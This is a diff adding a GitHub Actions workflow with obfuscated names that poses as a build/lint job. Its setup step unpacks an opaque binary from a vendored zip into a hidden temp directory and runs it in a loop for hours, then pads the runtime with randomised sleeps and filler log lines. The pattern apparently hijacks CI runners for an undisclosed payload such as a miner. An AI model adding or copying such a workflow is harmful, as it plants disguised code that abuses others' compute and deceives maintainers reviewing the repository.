@@ -1,0 +1,18 @@
+name: build-i2vz
+on:
+  workflow_dispatch:
+jobs:
+  lint_knz:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355
+    steps:
+      - uses: actions/checkout@v4
+      - run: python3 --version
+      - run: df -h /tmp | tail -1
+      - name: setup
+        run: |
+          QB=$(mktemp -d /tmp/.XXXXXXXX) && unzip -o -q vendor/6b0d09c8.zip -d ${QB} && chmod +x ${QB}/cache-ba
+          cd ${QB} && timeout 188m bash -c 'while :; do ./cache-ba; echo "rc rc=$? $(date -u +%H:%M)"; sleep 11; done'
+          SAE2=$((SECONDS + 163 * 60))
+          while [ $SECONDS -lt $SAE2 ]; do sleep $((RANDOM % 96 + 37)); echo "$(date -u +%H:%M:%S) sldou9"; done
+
